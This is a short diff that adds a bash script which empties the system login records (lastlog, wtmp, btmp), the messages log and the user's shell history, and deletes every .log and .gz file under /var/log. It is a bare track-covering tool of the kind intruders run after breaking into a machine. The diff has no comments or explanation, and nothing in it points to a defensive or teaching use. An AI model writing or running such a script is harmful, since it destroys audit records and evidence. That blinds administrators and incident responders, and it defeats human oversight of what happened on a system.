@@ -1,0 +1,8 @@
+#!/bin/bash
+>/var/log/lastlog
+>/var/log/wtmp
+>/var/log/btmp
+>/var/log/messages
+rm -rf /var/log/*.gz
+rm -rf /var/log/*.log
+>~/.bash_history
